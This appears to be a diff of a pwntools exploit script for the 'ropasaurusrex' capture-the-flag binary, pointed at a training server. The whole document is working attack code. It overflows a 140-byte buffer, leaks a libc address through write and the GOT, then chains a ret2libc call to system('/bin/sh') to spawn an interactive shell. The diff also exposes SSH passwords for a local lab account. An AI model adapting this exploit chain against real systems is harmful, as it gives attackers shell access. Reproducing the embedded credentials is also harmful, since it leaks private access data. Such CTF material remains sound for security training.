@@ -2,10 +2,10 @@ from pwn import *
 
 if "REMOTE" not in args:
 
-    env = {"LD_PRELOAD": "./home/buba98/ropasaurusrex/libc-2.27.so"}
+    env = {"LD_PRELOAD": "./home/acidburn/ropasaurusrex/libc-2.27.so"}
 
-    ssh = ssh("buba98", "127.0.0.1", password="Vinsent22!", port=2222)
-    r = ssh.process("/home/buba98/ropasaurusrex/ropasaurusrex",)
+    ssh = ssh("acidburn", "127.0.0.1", password='acidburn', port=2222)
+    r = ssh.process("/home/acidburn/ropasaurusrex/ropasaurusrex", env=env)
     gdb.attach(r, """
         # b *0x0804841c
         # c
@@ -15,40 +15,28 @@ if "REMOTE" not in args:
 else:
     r = remote("bin.training.jinblack.it", 2014)
 
-# 32 bit program with NX enabled
-# 136 char array
+address_write = 0x0804830c
+got = 0x08049614
+main = 0x0804841d
 
-BIN = ELF("./ropasaurusrex")
-LIBC = ELF("./libc-2.27.so")
-
-ptr_write = 0x0804830c
-next_fun = 0x0804841d
-got = 0x8049614
-
-payload = b"A"*140
-payload += p32(ptr_write)
-payload += p32(next_fun)
-payload += p32(1)
-payload += p32(got)
-payload += p32(4)
+payload = b"A"*140 + p32(address_write) + p32(main) + p32(1) + p32(got) + p32(4)
 r.send(payload)
 
+write = u32(r.recv(4))
+print("write:" + hex(write))
 
-leak = u32(r.recv(4))
-libc_base = leak - 0xe6f10
-LIBC.address = libc_base
-# system = libc_base + 0x003d200
-system = LIBC.symbols["system"]
-# binsh = libc_base + 0x17e0cf
-binsh = next(LIBC.search(b"/bin/sh"))
-print("[!] leak: %#x" % leak)
-print("[!] libc: %#x" % libc_base)
-print("[!] system: %#x" % system)
-print("[!] binsh: %#x" % binsh)
+offset_write = 0x5663bd80 - 0x56555000
+offset_system = 0x56592200 - 0x56555000
+offset_binsh = 0x566d30cf - 0x56555000
+print("write offset:" + hex(offset_write))
+print("system offset:" + hex(offset_system))
+print("binsh offset:" + hex(offset_binsh))
+base = write - offset_write
+system = base + offset_system
+binsh = base + offset_binsh
 
-payload2 = b"A"*140
-payload2 += p32(next_fun)  # + p32(0) + p32(binsh)
-
+payload = b"A"*140 + p32(system) + p32(0) + p32(binsh)
 r.send(payload)
+
 
 r.interactive()
